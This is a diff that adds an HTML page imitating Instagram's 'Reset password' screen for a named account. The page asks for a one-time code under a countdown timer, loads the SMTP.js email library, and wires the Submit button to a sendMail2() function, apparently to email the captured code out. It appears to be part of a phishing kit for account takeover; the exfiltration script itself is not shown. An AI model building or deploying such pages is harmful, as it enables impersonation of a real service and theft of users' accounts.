@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Password Reset</title>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script src="script2.js"></script>
+    <script>
+       function countdown(minutes) {
+            var seconds = 60;
+            var mins = minutes
+            function tick() {
+                //This script expects an element with an ID = "counter". You can change that to what ever you want. 
+                var counter = document.getElementById("counter");
+                var current_minutes = mins-1
+                seconds--;
+                counter.innerHTML = current_minutes.toString() + ":" + (seconds < 10 ? "0" : "") + String(seconds);
+                if( seconds > 0 ) {
+                    setTimeout(tick, 1000);
+                } else {
+                    if(mins > 1){
+                        countdown(mins-1);           
+                    }
+                }
+            }
+            tick();
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .reset-container {
+            background: linear-gradient(rgba(255, 116, 116, 0.141),rgba(133, 137, 255, 0.168));
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            /* text-align: center; */
+        }
+
+        h2 {
+            color: #262626;
+        }
+
+        p {
+            color: #999;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+
+        button {
+            background-color: #3897f0;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #2671a8;
+        }
+        #counter {
+            float: right;
+        }
+    </style>
+</head>
+<body onload="countdown(5)">
+
+<div class="reset-container">
+    <p>pooh_jaa28 · Instagram</p>
+
+    <h2>Reset password</h2>
+    </br>
+    
+   
+    <form action="verify.html" method="post">
+        <input type="password" id="c1" name="OTP" placeholder="Enter OTP" required>
+        <p><a href="verify.html" id="resend">Resend Code</a><span id="counter">2:00</span></p>
+        <button type="button" onclick="sendMail2()">Submit</button>
+    </form>
+</div>
+
+</body>
+</html>
